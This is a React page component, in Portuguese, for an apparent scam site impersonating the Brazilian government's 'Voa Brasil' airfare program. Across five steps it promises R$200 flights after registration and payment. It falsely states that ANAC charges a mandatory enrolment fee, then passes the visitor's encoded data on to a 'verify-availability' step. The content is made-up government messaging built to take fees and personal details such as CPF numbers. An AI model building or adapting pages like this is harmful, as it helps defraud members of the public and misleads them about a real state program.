import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { Loader2, Check } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import Header from "../components/Header";

const programInfo = [
  {
    title: "Programa Voa Brasil",
    content: "Continue no site e finalize sua inscrição para ter acesso a passagens aéreas por preços especiais. O programa é uma iniciativa do governo federal que democratiza o acesso ao transporte aéreo para famílias brasileiras.",
    image: "https://dicasdahora.com.br/wp-content/uploads/2024/12/PROGRAMA-VOA-BRASIL-930x620.jpg"
  },
  {
    title: "Acesso ao Aplicativo",
    content: "Após finalizar seu cadastro e pagamento, você receberá acesso ao aplicativo oficial. Use seu CPF para acessar e começar a buscar passagens com desconto exclusivo.",
    image: "https://i.ibb.co/jzPF8jS/CPF.png"
  },
  {
    title: "Busca de Voos",
    content: "Selecione origem e destino no aplicativo. Encontre voos por apenas R$200,00 para qualquer lugar do Brasil. Filtre por data, horário e companhia aérea de sua preferência.",
    image: "https://i.ibb.co/09FZmB5/CPF-1.png"
  },
  {
    title: "Finalização da Compra",
    content: "Escolha os voos ideais e pague de forma segura por cartão ou PIX. Receba imediatamente o código de confirmação e faça check-in online ou no aeroporto.",
    image: "https://i.ibb.co/ns9dWXm/CPF-2.png"
  },
  {
    title: "Taxa de Adesão ANAC",
    content: "Se você for aprovado no programa, a ANAC (Agência Nacional de Aviação Civil) cobra uma taxa de inscrição referente a impostos e regulamentações do setor aéreo. Esta taxa é obrigatória para sua participação no Programa Voa Brasil e garante sua elegibilidade para os voos com desconto.",
    image: "https://i.ibb.co/svQ2MhSn/467399557-122186582240204702-3803577258209353643-n.jpg"
  }
];

export default function SaibaMais() {
  const [currentStep, setCurrentStep] = useState(0);
  const [buttonState, setButtonState] = useState<'idle' | 'loading' | 'success'>('idle');
  const [, setLocation] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const encodedData = searchParams.get('data');

  const handleNext = async () => {
    setButtonState('loading');
    await new Promise(resolve => setTimeout(resolve, 1000));

    if (currentStep < programInfo.length - 1) {
      setButtonState('success');
      setTimeout(() => {
        setCurrentStep(prev => prev + 1);
        setButtonState('idle');
      }, 500);
    } else {
      setButtonState('success');
      setTimeout(() => {
        setLocation(`/verify-availability?data=${encodedData}`);
      }, 500);
    }
  };

  return (
    <div>
      <Header />

      <div className="container" style={{ maxWidth: 'none', width: '100%' }}>
        <main id="main-signin" style={{ width: '100%', maxWidth: '1200px', margin: '0 auto', padding: '2rem' }}>
          <div className="w-full">
            <div>
                <motion.div 
                  className="flex items-center gap-3 mb-4"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ duration: 0.3 }}
                >
                  <div className="flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium">
                    {currentStep + 1}
                  </div>
                  <p className="font-semibold text-base">{programInfo[currentStep].title}</p>
                </motion.div>
                <div className="space-y-3 flex flex-col items-center">
                  <AnimatePresence mode="wait">
                    <motion.div
                      key={currentStep}
                      initial={{ opacity: 0, x: 50 }}
                      animate={{ opacity: 1, x: 0 }}
                      exit={{ opacity: 0, x: -50 }}
                      transition={{ duration: 0.5 }}
                      className="flex justify-center mb-4"
                    >
                      <img
                        src={programInfo[currentStep].image}
                        alt={programInfo[currentStep].title}
                        className="w-[380px] h-[380px] md:w-[480px] md:h-[480px] object-cover rounded-[10px] shadow-lg"
                        style={{ maxWidth: 'none', maxHeight: 'none' }}
                      />
                    </motion.div>
                  </AnimatePresence>
                  <AnimatePresence mode="wait">
                    <motion.div
                      key={currentStep}
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0, y: -20 }}
                      transition={{ duration: 0.5 }}
                      className="bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]"
                    >
                      <p className="text-gray-700 leading-relaxed text-base">
                        {programInfo[currentStep].content}
                      </p>
                    </motion.div>
                  </AnimatePresence>
                </div>

                <div className="flex justify-center mt-6">
                  <button
                    type="button"
                    onClick={handleNext}
                    disabled={buttonState !== 'idle'}
                    className="button-continuar flex items-center justify-center gap-2 min-w-[160px]"
                  >
                    {buttonState === 'loading' && <Loader2 className="h-4 w-4 animate-spin" />}
                    {buttonState === 'success' && <Check className="h-4 w-4" />}
                    {buttonState === 'loading' ? 'Processando...' :
                      buttonState === 'success' ? 'Concluído' : 
                      currentStep === programInfo.length - 1 ? 'Finalizar' : 'Avançar'}
                  </button>
                </div>
            </div>
          </div>
        </main>
      </div>
    </div>
  );
}